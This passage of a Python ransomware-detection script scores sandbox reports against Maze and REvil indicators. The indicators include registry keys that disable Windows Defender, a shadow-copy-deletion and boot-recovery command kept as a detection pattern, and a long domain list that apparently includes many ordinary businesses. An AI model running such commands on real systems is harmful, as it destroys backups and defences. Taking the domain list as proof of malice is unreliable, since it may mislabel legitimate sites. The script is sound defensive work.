                            "T1031","T1055","T1116","T1089","T1202","T1112","T1108","T1097","T1077","T1490","T1583","T1583.003","T1587","T1587.003",
                            "T1588","T1588.003","T1588.004","T1566","T1566.001","T1090.003","T1090","T1573","T1573.002","T1071.001","T1041","T1560",
                            "T1074.001","T1053.005","T1082","T1057","T1059.001"]
        
        for i in dictionary["data"]["attack_techniques"]:
            for j in mitre_techniques:
                if j in i:
                    total += 1
        #print("Total total est : "+str(len(dictionary["data"]["mitre_attack_techniques"]))+"/"+str(total))
    except KeyError:
        total += 0

    # ip_traffic
    
    try :
        for i in dictionary["data"]["ip_traffic"]:
            for j in i:
                if j in "destination_ip":
                    for k in SUSPICIOUS_NETWORK_IPS:
                        if k in i[j]:
                            total += 1
                if j in "destination_port":
                    for k in SUSPICIOUS_NETWORK_PORT:
                        if k == i[j]:
                            total += 1
        #print("Total ip_traffic est : "+str(5*len(dictionary["data"]["ip_traffic"]))+"/"+str(total))
    except KeyError:
        total += 0
    
    # files_copied
    
    try :
        for i in dictionary["data"]["files_copied"]:
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i["destination"].lower():
                    total += 1
            for j in TERMES:
                if j.lower() in i["destination"].lower():
                    total += 1
            for j in MAZE_EXTENSIONS:
                if j in i["destination"]:
                    total += 1
        #print("Total files_copied est : "+str(4 * len(dictionary["data"]["files_copied"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files_written
    try :
        
        for i in dictionary["data"]["files_written"]:
            for j in MAZE_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if j.lower() in i.lower():
                    total += 1
            for j in TERMES:
                if j.lower() in i.lower():
                    total += 1
            
        #print("Total files_written est : "+str(len(dictionary["data"]["files_written"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files_dropped
    try :
        
        for i in dictionary["data"]["files_dropped"]:
            for j in i:
                if "path" in j:
                    for k in MAZE_EXTENSIONS:
                        if k.lower() in i[j].lower():
                            total += 1
                    for k in SUSPICIOUS_PROCESS_NAMES:
                        if k.lower() in i[j].lower():
                            total += 1
                    for k in PATH_RANSOMWARE:
                        if k.lower() in i[j].lower():
                            total += 1
                    for k in TERMES:
                        if k in i[j]:
                            total += 1
            
        #print("Total files_dropped est : "+str(len(dictionary["data"]["files_dropped"]))+"/"+str(total))
    except KeyError:
        total += 0

    # command_executions
    try :
        
        for i in dictionary["data"]["command_executions"]:
            for j in power_shell_cmd :
                if j in i:
                    total += 1
        #print("Total command_executions est : "+str(2*len(dictionary["data"]["files_dropped"]))+"/"+str(total))
    except KeyError:
        total += 0

    
    # memory_pattern_urls
    try :
        
        for i in dictionary["data"]["memory_pattern_urls"]:
            for j in URLS_SUSPECTS:
                if j in i:
                    total += 1
            for j in SUSPICIOUS_NETWORK_IPS:
                if j in i:
                    total += 1
            
        #print("Total memory_pattern_urls est : "+str(len(dictionary["data"]["memory_pattern_urls"]))+"/"+str(total))
    except KeyError:
        total += 0
    # http_conversations
    try :
        for i in dictionary["data"]["http_conversations"]:
            for j in URLS_SUSPECTS:
                if j in i["url"]:
                    total += 1
            for j in SUSPICIOUS_NETWORK_IPS:
                if j in i["url"]:
                    total += 1
            
        #print("Total http_conversations est : "+str(len(dictionary["data"]["http_conversations"]))+"/"+str(total))
    except KeyError:
        total += 0
    # Calculate the probs
    #print("[MAZE] ~ La somme de tout est : "+str(total))
    return total

def check_for_revil_Sodinokibi_behaviors(json_file):
    # Somme total 
    total = 0

    # Read the file json
    with open(json_file) as f:
        report_data = f.read()
    dictionary = json.loads(report_data)

    # List of common file extensions encrypted by revil
    revil_EXTENSIONS = [".revil",".veds",".klflf",".sodinokibi"]
    
    # List of common registry keys modified by revil
    revil_REGISTRY_KEYS = [
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers\RC4",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL",
        r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network",
        "HKLM\\SOFTWARE\\WOW6432NODE\\MICROSOFT\\TRACING\\0036407552_RASAPI32",
        "HKLM\\Software\\Microsoft\\Tracing\\ESET32_RASAPI32",
        "HKLM\\Software\\Microsoft\\Tracing\\ESET32_RASMANCS",
        "\\REGISTRY\\MACHINE\\Software\\Wow6432Node\\Microsoft\\Tracing\\RASAPI32",
        "\\REGISTRY\\MACHINE\\Software\\Wow6432Node\\Microsoft\\Tracing\\RASMANCS",
        r"HKEY_CURRENT_USER\Software[random_name]",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKEY_CURRENT_USER\Control Panel\Desktop\Wallpaper",
        r"HKEY_CURRENT_USER\Control Panel\Desktop\WallpaperStyle",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\exe.docx\UserChoice\Progid",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\exe.docx\OpenWithList",
        r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\exe.docx\OpenWithProgids",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Enhanced RSA and AES Cryptographic Provider",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Strong Cryptographic Provider",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
        r"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableRealtimeMonitoring",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableBehaviorMonitoring",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Monitoring\DisableIntrusionPreventionSystem",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
        "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Rpc\\Extensions",
        "HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Microsoft\\Rpc",
        "HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options",
        "HKEY_LOCAL_MACHINE\\Software\\WOW6432Node\\Policies\\Microsoft\\Windows NT\\Rpc",
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces",
        "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces",
        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal",
        "HKLM\\Software\\Microsoft\\Cryptography",
        "HKLM\\Software\\Policies\\Microsoft\\Cryptography",
        "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Strong Cryptographic Provider",
        "HKLM\\Software\\Microsoft\\Cryptography\\Offload",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Winsock\\Setup Migration\\Providers\\Tcpip6",
        r"\REGISTRY\MACHINE\SOFTWARE\Wow6432Node\LFF9miD",
        "<HKLM>\\SOFTWARE\\Wow6432Node\\LFF9miD",
        "HKLM\\Software\\SBB CFF FFS AG\\Ransimware\\1.0.0.0"
    ]
    
    TERMES = ["top secret","Important confidential","Important equipment","Interior Pictures","Legal Affairs"]

    # Check for suspicious process names associated with revil
    SUSPICIOUS_PROCESS_NAMES = ["user32.dll","HOW-TO-DECRYPT.txt","dontsleep.exe","msmpeng.exe","netscan.exe","m.exe","Taschost.exe","u0441host.exe","int32.dll","psexec.exe","Invoice_29557473.exe","windef.exe","win163.65.tmp",
                                "winupd.tmp","officeupd.tmp","mswordupd.tmp","dospizdos.tmp","wordupd.tmp","wordupd_3.0.1.tmp","srv.txt",
                                "wm_start.bat","copy_files_srv.bat","rclone.exe","README.txt","ShellExperienceHost.exe","net.exe",
                                "revil_readme.txt", "taskdl.exe", "cobaltstrike.exe", "powershell.exe","cmd.exe", "rundll32.exe", "wscript.exe", 
                                "lsass.exe", "svchost.exe", "explorer.exe", "spoolsv.exe","crypt32.dll","bcrypt.dll","ncrypt.dll","CRYPTBASE.dll",
                                "wuapihost.exe","WMIC.exe","conhost.exe","CRYPTSP.dll","rpcrt4.dll","revil.exe","sc.exe","svc.exe","winlogon.exe",
                                "wermgr.exe","rdpclip.exe","wininit.exe","regsvr32.exe","wininet.dll","userinit.dll","wuauclt.exe",
                                "winrm.vbs","logonui.exe","backup.exe","msvcrt.dll","RpcRtRemote.dll","rasapi32.dll","rasman.dll","winime32.dll",
                                "DECRYPT-FILES.txt","wmiprvse.exe","decrypt-files.html","unsecapp.exe","PXxGl2m5n3.exe","dllhost.exe","services.exe"
                                , "winlogon.exe","taskhost.exe","csrss.exe","ctfmon.exe","dwm.exe","mshta.exe","mstsc.exe","notepad.exe","netsh.exe",
                                "mmc.exe","calc.exe","chkdsk.exe","winword.exe","excel.exe","lsm.exe","osk.exe","msconfig.exe","winrm.exe","sethc.exe",
                                "cscript.exe","snippingtool.exe","schtasks.exe","Decryptor.exe","VKtt.exe","sppsvc.exe","mscorsvw.exe","msiexec.exe"]
    PATH_RANSOMWARE = [r"%APPDATA%\teamviewers\msi.dll",r"c:\windows\192145.dll,StartW",
                    "C:\\bootmgr","C:\\totalcmd\\","C:\\Far2\\",
                    "C:\\Users\\user\\Documents\\",
                    "C:\\decrypt",
                    "C:\\Documents and Settings\\Administrator\\Local Settings\\Temp\\",
                    "C:\\Users\\<USER>\\Downloads\\ransimware.exe",
                    r"C:\Users\USER\AppData\Local\Temp\icju1.exe","%CONHOST%","C:\\Far2\\Plugins\\"
                    "C:\\ProgramData\\Microsoft\\Crypto\\RSA","C:\\Windows\\system32\\rsaenh.dll",
                    "C:\\Users\\All Users\\Microsoft\\Crypto\\RSA\\","c:\\programdata\\microsoft\\crypto\\rsa\\",
                    "C:\\Documents and Settings\\All Users\\Microsoft\\Crypto\\RSA\\",
                    "${SamplePath}\\","<PATH_SAMPLE.EXE>","%SAMPLEPATH%"]
    power_shell_cmd = ["cmd.exe /c vssadmin.exe Delete Shadows /All /Quiet & bcdedit /set {default}",
                    "recoveryenabled No & bcdedit /set {default} bootstatuspolicy ignoreallfailures"]
    # UNC2198
    # Check for suspicious network connections associated with revil
    SUSPICIOUS_NETWORK_IPS = ["54.39.233.132","45.67.14.162","185.193.141.248","185.234.218.9"]
    SUSPICIOUS_NETWORK_PORT = [137,138,21,22,135,443,445,1433,1434,3389,4343,5000,5985,5355,8079,25055,4132,4124,4114,53]
    URLS_SUSPECTS = ['Anmcousa.xyz','Blaerck.xyz','cklinosleeve.icu','fcamylleibrahim.top','.onion','hcp://system','res://ieframe.dll','localhost','101gowrie.com', '123vrachi.ru', '12starhd.online', '1kbk.com.ua', '1team.es', '2ekeus.nl', '321play.com.hk', '35-40konkatsu.net', '365questions.org', '4net.guru', '4youbeautysalon.com', '8449nohate.org', 'DupontSellsHomes.com', 'aakritpatel.com', 'aarvorg.com', 'abitur-undwieweiter.de', 'abl1.net', 'abogadoengijon.es', 'abogados-en-alicante.es', 'abogadosaccidentetraficosevilla.es', 'abogadosadomicilio.es', 'abuelos.com', 'accountancywijchen.nl', 'aco-media.nl', 'acomprarseguidores.com', 'actecfoundation.org', 'admos-gleitlager.de', 'adoptioperheet.fi', 'adultgamezone.com', 'advizewealth.com', 'advokathuset.dk', 'agence-chocolat-noir.com', 'agence-referencement-naturel-geneve.net', 'aglend.com.au', 'ahouseforlease.com', 'ai-spt.jp', 'airconditioning-waalwijk.nl', 'alfa-stroy72.com', 'alhashem.net', 'all-turtles.com', 'allamatberedare.se', 'allentownpapershow.com', 'allfortheloveofyou.com', 'allure-cosmetics.at', 'almosthomedogrescue.dog', 'alsace-first.com', 'alten-mebel63.ru', 'alvinschwartz.wordpress.com', 'alysonhoward.com', 'americafirstcommittee.org', 'amerikansktgodis.se', 'aminaboutique247.com', 'ampisolabergeggi.it', 'amylendscrestview.com', 'analiticapublica.es', 'andersongilmour.co.uk', 'aniblinova.wordpress.com', 'answerstest.ru', 'antenanavi.com', 'anteniti.com', 'anthonystreetrimming.com', 'antiaginghealthbenefits.com', 'antonmack.de', 'anybookreader.de', 'aodaichandung.com', 'apolomarcas.com', 'apprendrelaudit.com', 'appsformacpc.com', 'aprepol.com', 'architecturalfiberglass.org', 'architekturbuero-wagner.net', 'argenblogs.com.ar', 'argos.wityu.fund', 'art2gointerieurprojecten.nl', 'artallnightdc.com', 'arteservicefabbro.com', 'artige.com', 'artotelamsterdam.com', 'aselbermachen.com', 'asgestion.com', 'asiluxury.com', 'associacioesportivapolitg.cat', 'associationanalytics.com', 'assurancesalextrespaille.fr', 'asteriag.com', 'atalent.fi', 'ateliergamila.com', 'atmos-show.com', 'atozdistribution.co.uk', 'augenta.com', 'aunexis.ch', 'aurum-juweliere.de', 'ausair.com.au', 'ausbeverage.com.au', 'austinlchurch.com', 'autodemontagenijmegen.nl', 'autodujos.lt', 'autofolierung-lu.de', 'autopfand24.de', 'babcockchurch.org', 'backstreetpub.com', 'bafuncs.org', 'balticdentists.com', 'balticdermatology.lt', 'baptisttabernacle.com', 'bargningavesta.se', 'bargningharnosand.se', 'baronloan.org', 'basisschooldezonnewijzer.nl', 'bastutunnan.se', 'bauertree.com', 'baumkuchenexpo.jp', 'baustb.de', 'baylegacy.com', 'bayoga.co.uk', 'bbsmobler.se', 'beaconhealthsystem.org', 'beautychance.se', 'behavioralmedicinespecialists.com', 'berlin-bamboo-bikes.org', 'berliner-versicherungsvergleich.de', 'bestbet.com', 'besttechie.com', 'better.town', 'beyondmarcomdotcom.wordpress.com', 'bhwlawfirm.com', 'biapi-coaching.fr', 'bierensgebakkramen.nl', 'bigasgrup.com', 'bigbaguettes.eu', 'bigler-hrconsulting.ch', 'bildungsunderlebnis.haus', 'bimnapratica.com', 'binder-buerotechnik.at', 'bingonearme.org', 'biortaggivaldelsa.com', 'birnam-wood.com', 'blacksirius.de', 'blewback.com', 'blgr.be', 'blog.solutionsarchitect.guru', 'blogdecachorros.com', 'bloggyboulga.net', 'blood-sports.net', 'blossombeyond50.com', 'blumenhof-wegleitner.at', 'bockamp.com', 'body-armour.online', 'body-guards.it', 'bodyforwife.com', 'bodyfulls.com', 'bogdanpeptine.ro', 'boisehosting.net', 'boldcitydowntown.com', 'bookspeopleplaces.com', 'boompinoy.com', 'boosthybrid.com.au', 'bordercollie-nim.nl', 'botanicinnovations.com', 'bouldercafe-wuppertal.de', 'boulderwelt-muenchen-west.de', 'bouncingbonanza.com', 'bouquet-de-roses.com', 'bowengroup.com.au', 'bptdmaluku.com', 'bradynursery.com', 'braffinjurylawfirm.com', 'brandl-blumen.de', 'brawnmediany.com', 'brevitempore.net', 'bricotienda.com', 'bridgeloanslenders.com', 'brigitte-erler.com', 'bristolaeroclub.co.uk', 'broseller.com', 'bsaship.com', 'bunburyfreightservices.com.au', 'bundabergeyeclinic.com.au', 'burkert-ideenreich.de', 'buroludo.nl', 'buymedical.biz', 'bxdf.info', 'c-a.co.in', 'c2e-poitiers.com', 'cactusthebrand.com', 'cafemattmeera.com', 'caffeinternet.it', 'calabasasdigest.com', 'calxplus.eu', 'campus2day.de', 'campusoutreach.org', 'camsadviser.com', 'candyhouseusa.com', 
                    'caribbeansunpoker.com', 'caribdoctor.org', 'carlosja.com', 'carolinepenn.com', 'carriagehousesalonvt.com', 'carrybrands.nl', 'castillobalduz.es', 'catholicmusicfest.com', 'ccpbroadband.com', 'ceid.info.tr', 'celeclub.org', 'celularity.com', 'centromarysalud.com', 'centrospgolega.com', 'centuryrs.com', 'cerebralforce.net', 'ceres.org.au', 'chandlerpd.com', 'chaotrang.com', 'charlesreger.com', 'charlottepoudroux-photographie.fr', 'chatizel-paysage.fr', 'chavesdoareeiro.com', 'chefdays.de', 'cheminpsy.fr', 'chrissieperry.com', 'christ-michael.net', 'christinarebuffetcourses.com', 'cimanchesterescorts.co.uk', 'cirugiauretra.es', 'cite4me.org', 'citymax-cr.com', 'cityorchardhtx.com', 'classycurtainsltd.co.uk', 'cleliaekiko.online', 'clos-galant.com', 'cnoia.org', 'coastalbridgeadvisors.com', 'coding-machine.com', 'coding-marking.com', 'coffreo.biz', 'collaborativeclassroom.org', 'colorofhorses.com', 'comarenterprises.com', 'commercialboatbuilding.com', 'commonground-stories.com', 'comparatif-lave-linge.fr', 'completeweddingkansas.com', 'compliancesolutionsstrategies.com', 'conasmanagement.de', 'conexa4papers.trade', 'connectedace.com', 'consultaractadenacimiento.com', 'controldekk.com', 'copystar.co.uk', 'corelifenutrition.com', 'corendonhotels.com', 'corola.es', 
                    'corona-handles.com', 'cortec-neuro.com', 'coursio.com', 'courteney-cox.net', 'craftleathermnl.com', 'craigmccabe.fun', 'craigvalentineacademy.com', 'cranleighscoutgroup.org', 'creamery201.com', 'creative-waves.co.uk', 'crediacces.com', 'croftprecision.co.uk', 'crosspointefellowship.church', 'crowd-patch.co.uk', 'csgospeltips.se', 'ctrler.cn', 'cuppacap.com', 'cursoporcelanatoliquido.online', 'cursosgratuitosnainternet.com', 'cuspdental.com', 'cwsitservices.co.uk', 'cyntox.com', 'd1franchise.com', 'd2marketing.co.uk', 'daklesa.de', 'danholzmann.com', 'daniel-akermann-architektur-und-planung.ch', 'danielblum.info', 'danskretursystem.dk', 'danubecloud.com', 'dareckleyministries.com', 'darnallwellbeing.org.uk', 'darrenkeslerministries.com', 'datacenters-in-europe.com', 'deepsouthclothingcompany.com', 'degroenetunnel.com', 'dekkinngay.com', 'deko4you.at', 'delchacay.com.ar', 'deltacleta.cat', 'denifl-consulting.at', 'denovofoodsgroup.com', 'deoudedorpskernnoordwijk.nl', 'deprobatehelp.com', 'deschl.net', 'desert-trails.com', 'despedidascostablanca.es', 'destinationclients.fr', 'devlaur.com', 'devok.info', 'devstyle.org', 'dezatec.es', 'digi-talents.com', 'digivod.de', 'dinslips.se', 'directwindowco.com', 'dirittosanitario.biz', 'ditog.fr', 'div-vertriebsforschung.de', 'diversiapsicologia.es', 'dlc.berlin', 'dnepr-beskid.com.ua', 'dontpassthepepper.com', 'dpo-as-a-service.com', 'dr-pipi.de', 'dr-seleznev.com', 'dr-tremel-rednitzhembach.de', 'dramagickcom.wordpress.com', 'drfoyle.com', 'drinkseed.com', 'drnice.de', 'drugdevice.org', 'dsl-ip.de', 'dublikator.com', 'dubnew.com', 'dubscollective.com', 'durganews.com', 'dushka.ua', 'dutchbrewingcoffee.com', 'dutchcoder.nl', 'dw-css.de', 'eadsmurraypugh.com', 'eaglemeetstiger.de', 'easytrans.com.au', 'echtveilig.nl', 'eco-southafrica.com', 'ecoledansemulhouse.fr', 'ecopro-kanto.com', 'ecpmedia.vn', 'edelman.jp', 'edgewoodestates.org', 'edrcreditservices.nl', 'educar.org', 'edv-live.de', 'effortlesspromo.com', 'eglectonk.online', 'elimchan.com', 'elpa.se', 'em-gmbh.ch', 'embracinghiscall.com', 'employeesurveys.com', 'enovos.de', 'entopic.com', 'epwritescom.wordpress.com', 'eraorastudio.com', 'erstatningsadvokaterne.dk', 'esope-formation.fr', 'euro-trend.pl', 'evangelische-pfarrgemeinde-tuniberg.de', 'evergreen-fishing.com', 'evologic-technologies.com', 'executiveairllc.com', 'exenberger.at', 'expandet.dk', 'extensionmaison.info', 'extraordinaryoutdoors.com', 'facettenreich27.de', 'fairfriends18.de', 'faizanullah.com', 'falcou.fr', 'familypark40.com', 'fannmedias.com', 'farhaani.com', 'faroairporttransfers.net', 'fatfreezingmachines.com', 'fax-payday-loans.com', 'fayrecreations.com', 'femxarxa.cat', 'fensterbau-ziegler.de', 'fibrofolliculoma.info', 'figura.team', 'filmstreamingvfcomplet.be', 'filmvideoweb.com', 'financescorecard.com', 'finde-deine-marke.de', 'finediningweek.pl', 'first-2-aid-u.com', 'firstpaymentservices.com', 'fiscalsort.com', 'fitnessbazaar.com', 'fitnessingbyjessica.com', 'fitovitaforum.com', 'fizzl.ru', 'flexicloud.hk', 'forestlakeuca.org.au', 'foretprivee.ca', 'forskolorna.org', 'foryourhealth.live', 'fotoideaymedia.es', 'fotoscondron.com', 'fransespiegels.nl', 'freie-baugutachterpraxis.de', 'freie-gewerkschaften.de', 'friendsandbrgrs.com', 'frontierweldingllc.com', 'ftf.or.at', 'ftlc.es', 'fundaciongregal.org', 'funjose.org.gt', 'gadgetedges.com', 'gaiam.nl', 'galleryartfair.com', 'galserwis.pl', 'gamesboard.info', 'gantungankunciakrilikbandung.com', 'garage-lecompte-rouen.fr', 'gasbarre.com', 'gasolspecialisten.se', 'gastsicht.de', 'geekwork.pl', 'geisterradler.de', 'gemeentehetkompas.nl', 'geoffreymeuli.com', 'girlillamarketing.com', 'glennroberts.co.nz', 'global-kids.info', 'globedivers.wordpress.com', 'gmto.fr', 'gonzalezfornes.es', 'goodgirlrecovery.com', 'gopackapp.com', 'gporf.fr', 'gratispresent.se', 'greenfieldoptimaldentalcare.com', 'greenko.pl', 'greenpark.ch', 'grelot-home.com', 'groupe-cets.com', 'groupe-frayssinet.fr', 'grupocarvalhoerodrigues.com.br', 
                    'gw2guilds.org', 'gymnasedumanagement.com', 'haar-spange.com', 'hairnetty.wordpress.com', 'hairstylesnow.site', 'handi-jack-llc.com', 'hannah-fink.de', 'happyeasterimages.org', 'hardinggroup.com', 'haremnick.com', 'harpershologram.wordpress.com', 'harveybp.com', 'hashkasolutindo.com', 'hatech.io', 'havecamerawilltravel2017.wordpress.com', 'healthyyworkout.com', 'hebkft.hu', 'heidelbergartstudio.gallery', 'helenekowalsky.com', 'helikoptervluchtnewyork.nl', 'heliomotion.com', 'hellohope.com', 'henricekupper.com', 'herbayupro.com', 'herbstfeststaefa.ch', 'heurigen-bauer.at', 'hexcreatives.co', 'hhcourier.com', 'hiddencitysecrets.com.au', 'higadograsoweb.com', 'highimpactoutdoors.net', 'highlinesouthasc.com', 'hihaho.com', 'hkr-reise.de', 'hmsdanmark.dk', 'hokagestore.com', 'homecomingstudio.com', 'homesdollar.com', 'homng.net', 'hoteledenpadova.it', 'hotelsolbh.com.br', 'hotelzentral.at', 'houseofplus.com', 'hrabritelefon.hr', 'htchorst.nl', 'huehnerauge-entfernen.de', 'huesges-gruppe.de', 'hugoversichert.de', 'huissier-creteil.com', 'humanityplus.org', 'hushavefritid.dk', 'hvccfloorcare.com', 'hypozentrum.com', 'i-arslan.de', 'i-trust.dk', 'ianaswanson.com', 'icpcnj.org', 'id-et-d.fr', 'id-vet.com', 'idemblogs.com', 'igfap.com', 'igorbarbosa.com', 'igrealestate.com', 'ihr-news.jp', 'ikads.org', 'ilcdover.com', 'ilive.lt', 'ilso.net', 'imadarchid.com', 'imaginado.de', 'imperfectstore.com', 'importardechina.info', 'innote.fi', 'ino-professional.ru', 'insidegarage.pl', 'insigniapmg.com', 'insp.bi', 'instatron.net', 'intecwi.com', 'interactcenter.org', 'international-sound-awards.com', 'iphoneszervizbudapest.hu', 'iqbalscientific.com', 'irinaverwer.com', 'irishmachineryauctions.com', 'itelagen.com', 'ivfminiua.com', 'iviaggisonciliegie.it', 'ivivo.es', 'iwelt.de', 'iwr.nl', 'iyahayki.nl', 'iyengaryogacharlotte.com', 'izzi360.com', 'jacquin-maquettes.com', 'jadwalbolanet.info', 'jakekozmor.com', 'jameskibbie.com', 'jandaonline.com', 'jbbjw.com', 'jeanlouissibomana.com', 'jenniferandersonwriter.com', 'jerling.de', 'jiloc.com', 'jobcenterkenya.com', 'jobmap.at', 'johnsonfamilyfarmblog.wordpress.com', 'jolly-events.com', 'jorgobe.at', 'joseconstela.com', 'journeybacktolife.com', 'joyeriaorindia.com', 'jsfg.com', 'judithjansen.com', 'julis-lsa.de', 'juneauopioidworkgroup.org', 'jusibe.com', 'justinvieira.com', 'jvanvlietdichter.nl', 'jyzdesign.com', 'kadesignandbuild.co.uk', 'kafu.ch', 'kaliber.co.jp', 'kalkulator-oszczednosci.pl', 'kamahouse.net', 'kamienny-dywan24.pl', 'kaminscy.com', 'kampotpepper.gives', 'kao.at', 'kaotikkustomz.com', 'karacaoglu.nl', 'kariokids.com', 'kath-kirche-gera.de', 'katiekerr.co.uk', 'kedak.de', 'kenhnoithatgo.com', 'kevinjodea.com', 'ki-lowroermond.nl', 'kidbucketlist.com.au', 'kikedeoliveira.com', 'kindersitze-vergleich.de', 'kingfamily.construction', 'kirkepartner.dk', 'kisplanning.com.au', 'kissit.ca', 'klimt2012.info', 'klusbeter.nl', 'kmbshipping.co.uk', 'knowledgemuseumbd.com', 'kojima-shihou.com', 'kojinsaisei.info', 'koken-voor-baby.nl', 'koko-nora.dk', 'kostenlose-webcams.com', 'kosterra.com', 'krcove-zily.eu', 'krlosdavid.com', 'kuntokeskusrok.fi', 'kunze-immobilien.de', 'labobit.it', 'lachofikschiet.nl', 'ladelirante.fr', 'lange.host', 'lapinlviasennus.fi', 'lapinvihreat.fi', 'lapmangfpt.info.vn', 'lascuola.nl', 'latestmodsapks.com', 'latribuessentielle.com', 'launchhubl.com', 'layrshift.eu', 'lbcframingelectrical.com', 'leather-factory.co.jp', 'lebellevue.fr', 'lecantou-coworking.com', 'leda-ukraine.com.ua', 'ledmes.ru', 'leeuwardenstudentcity.nl', 'lefumetdesdombes.com', 'lenreactiv-shop.ru', 'leoben.at', 'lescomtesdemean.be', 'levdittliv.se', 'levihotelspa.fi', 'lichencafe.com', 
                    'licor43.de', 'lightair.com', 'ligiercenter-sachsen.de', 'liikelataamo.fi', 'liliesandbeauties.org', 'lillegrandpalais.com', 'limassoldriving.com', 'lionware.de', 'littlebird.salon', 'live-con-arte.de', 'live-your-life.jp', 'liveottelut.com', 'lmtprovisions.com', 'logopaedie-blomberg.de', 'longislandelderlaw.com', 'loprus.pl', 'lorenacarnero.com', 'love30-chanko.com', 'lubetkinmediacompanies.com', 'lucidinvestbank.com', 'luckypatcher-apkz.com', 'lukeshepley.wordpress.com', 'lusak.at', 'luxurytv.jp', 'lykkeliv.net', 'lynsayshepherd.co.uk', 'maasreusel.nl', 'macabaneaupaysflechois.com', 'madinblack.com', 'maineemploymentlawyerblog.com', 'makeflowers.ru', 'makeitcount.at', 'makeurvoiceheard.com', 'malychanieruchomoscipremium.com', 'manifestinglab.com', 'manijaipur.com', 'mank.de', 'manutouchmassage.com', 'mapawood.com', 'marathonerpaolo.com', 'maratonaclubedeportugal.com', 'marchand-sloboda.com', 'marcuswhitten.site', 'mardenherefordshire-pc.gov.uk', 'marietteaernoudts.nl', 'mariposapropaneaz.com', 'markelbroch.com', 'marketingsulweb.com', 'maryloutaylor.com', 'mastertechengineering.com', 'maureenbreezedancetheater.org', 'maxadams.london', 'mbxvii.com', 'mdacares.com', 'mdk-mediadesign.de', 'mediaacademy-iraq.org', 'mediaclan.info', 'mediaplayertest.net', 'memaag.com', 'mepavex.nl', 'mercantedifiori.com', 'merzi.info', 'meusharklinithome.wordpress.com', 'mezhdu-delom.ru', 'micahkoleoso.de', 'michaelsmeriglioracing.com', 'micro-automation.de', 'microcirc.net', 'midmohandyman.com', 'mikeramirezcpa.com', 'milanonotai.it', 'milestoneshows.com', 'milltimber.aberdeen.sch.uk', 'milsing.hr', 'minipara.com', 'mir-na-iznanku.com', 'miraclediet.fun', 'miriamgrimm.de', 'mirjamholleman.nl', 'mirjamholleman.nl', 'mirkoreisser.de', 'mmgdouai.fr', 'modamilyon.com', 'modelmaking.nl', 'modestmanagement.com', 'monark.com', 'mooglee.com', 'mooreslawngarden.com', 'mooshine.com', 'morawe-krueger.de', 'mountaintoptinyhomes.com', 'mountsoul.de', 'mousepad-direkt.de', 'moveonnews.com', 'mrsfieldskc.com', 'mrsplans.net', 'mrtour.site', 'mrxermon.de', 'muamuadolls.com', 'musictreehouse.net', 'myhealth.net.au', 'myhostcloud.com', 'mylolis.com', 'mylovelybluesky.com', 'mymoneyforex.com', 